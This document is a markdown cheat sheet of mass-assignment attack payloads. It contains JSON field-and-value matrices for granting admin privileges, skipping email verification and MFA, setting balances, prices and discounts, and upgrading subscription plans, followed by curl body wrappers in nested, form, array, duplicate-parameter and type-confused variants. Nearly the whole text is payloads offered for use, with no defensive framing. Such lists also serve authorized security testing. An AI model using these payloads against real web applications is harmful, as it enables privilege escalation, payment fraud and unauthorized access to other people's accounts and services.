# Payload variants deep — the field×value×carrier full matrix

## Privilege fields — full value matrix

```json
{"role":"admin"}            {"role":"superuser"}        {"role":"moderator"}
{"role":"operator"}         {"role":"staff"}            {"role":"internal"}
{"role":"developer"}        {"role":"root"}             {"role":"sysadmin"}
{"role":1}                  {"role":9}                  {"role":99}
{"role":true}               {"role":"yes"}              {"role":"1"}
{"is_admin":true}           {"is_admin":1}              {"is_admin":"true"}
{"isAdmin":true}            {"isAdmin":1}               {"admin":true}
{"admin":1}                 {"superuser":true}          {"is_staff":true}
{"isStaff":true}            {"staff":true}              {"moderator":true}
{"internal":true}           {"developer":true}          {"debug":true}
{"is_poweruser":true}       {"is_sudo":true}            {"god":true}
{"root":true}               {"su":true}                 {"operator":true}
{"sysadmin":true}           {"elevated":true}           {"privileged":true}
{"permissions":["*"]}       {"permissions":["admin"]}   {"permissions":{"all":true}}
{"scopes":["admin"]}        {"scopes":["*"]}            {"scopes":["write","admin"]}
{"groups":["admin"]}        {"groups":[{"id":1}]}       {"groups":[{"name":"admin"}]}
{"roles":["admin"]}         {"roles":["superuser"]}     {"role_ids":[1]}
{"authorities":["ROLE_ADMIN"]} {"capabilities":["all"]} {"entitlements":["*"]}
{"access_level":9}          {"accessLevel":9}           {"clearance":"top"}
{"tier":"admin"}            {"tier":9}                  {"rank":"admin"}
{"type":"admin"}            {"user_type":"admin"}       {"_t":"AdminUser"}
{"__t":"Admin"}             {"account_type":"admin"}    {"user_level":9}
{"membership_type":"admin"} {"role_name":"admin"}       {"usergroup":"admin"}
{"auth_level":9}            {"security_level":9}        {"domain_admin":true}
{"site_admin":true}         {"org_admin":true}          {"tenant_admin":true}
```

## Verification/state fields — full value matrix

```json
{"verified":true}           {"verified":1}              {"is_verified":true}
{"isVerified":true}         {"email_verified":true}     {"emailVerified":true}
{"email_verified_at":"2024-01-01"}  {"email_confirmed":true}
{"is_active":true}          {"isActive":true}           {"active":true}
{"activated":true}          {"approved":true}           {"is_approved":true}
{"isApproved":true}         {"confirmed":true}          {"is_confirmed":true}
{"onboarding_complete":true} {"setup_complete":true}    {"first_login":false}
{"mfa_enabled":false}       {"mfaEnabled":false}        {"totp_enabled":false}
{"otp_required":false}      {"bypass_2fa":true}         {"skip_verification":true}
{"requires_action":false}   {"action_required":false}   {"needs_setup":false}
{"status":"active"}         {"status":"approved"}       {"status":"verified"}
{"state":"active"}          {"workflow_state":"complete"} {"phase":"done"}
{"kyc_verified":true}       {"identity_verified":true}  {"age_verified":true}
{"tos_accepted":true}       {"terms_accepted":true}
```

## Economic fields — full value matrix

```json
{"balance":99999}           {"balance":1000000}         {"balance":1e6}
{"balance":99999.99}        {"credits":99999}           {"wallet":99999}
{"coins":99999}             {"points":99999}            {"tokens":99999}
{"score":99999}             {"xp":99999}                {"karma":99999}
{"store_credit":99999}      {"gift_card_balance":99999} {"reward_points":99999}
{"loyalty_points":99999}    {"cashback":99999}          {"bonus":99999}
{"price":0}                 {"price":0.01}              {"price":-1}
{"unit_price":0}            {"cost":0}                  {"amount":0}
{"total":0}                 {"total":0.01}              {"subtotal":0}
{"discount":100}            {"discount_percent":100}    {"discount":99999}
{"coupon":"FREE100"}        {"promo_code":"ADMIN"}      {"free_shipping":true}
{"freeShipping":true}       {"price_override":0}        {"lifetime_discount":true}
{"currency":"AAA"}          {"tax":0}                   {"shipping":0}
{"paid":true}               {"is_paid":true}            {"invoice_paid":true}
{"payment_verified":true}   {"credit_limit":1000000000} {"salary":99999}
{"payout":99999}            {"debt":0}                  {"transaction_limit":99999}
{"withdrawal_limit":99999}  {"available_credit":99999}
```

## Plan/entitlement fields — full value matrix

```json
{"plan":"enterprise"}       {"plan":"pro"}              {"plan":"admin"}
{"plan_id":5}               {"plan_id":9}               {"plan_id":99}
{"tier":"pro"}              {"tier":"enterprise"}       {"tier":9}
{"subscription":"pro"}      {"subscription_type":"lifetime"}
{"subscription":{"type":"lifetime","tier":"enterprise"}}
{"subscriptionTier":"enterprise"} {"seats":999}         {"quota":1000000000}
{"limits":{"requests":-1}}  {"rate_limit":0}            {"api_limit":99999}
{"bandwidth_limit":-1}      {"storage_quota":-1}        {"feature_flags":["*"]}
{"features":["premium","admin"]} {"entitlements":["*"]} {"package":"enterprise"}
{"level_name":"pro"}        {"pro":true}                {"premium":true}
{"enterprise":true}         {"trial":false}             {"lifetime":true}
{"vip":true}                {"founder":true}            {"license":"enterprise"}
{"license_tier":"max"}      {"billing_plan":"pro"}      {"membership_tier":"pro"}
{"member_level":9}          {"user_tier":"pro"}         {"access_tier":"pro"}
```

## The carrier wrappers

```bash
# flat JSON
-d '{"role":"admin"}'

# nested
-d '{"profile":{"role":"admin"}}'
-d '{"user":{"role":"admin"}}'
-d '{"settings":{"role":"admin"}}'
-d '{"profile":{"settings":{"admin":true}}}'

# form
-d 'role=admin'
-d 'user[role]=admin'
-d 'user[profile][role]=admin'
-d 'role[]=admin'

# array
-d '{"roles":["admin"]}'
-d '{"groups":[{"id":1}]}'

# dup
-d 'role=user&role=admin'
-d '{"role":"user","role":"admin"}'

# typed
-d '{"role":1}'
-d '{"role":true}'
-d '{"verified":"yes"}'
```
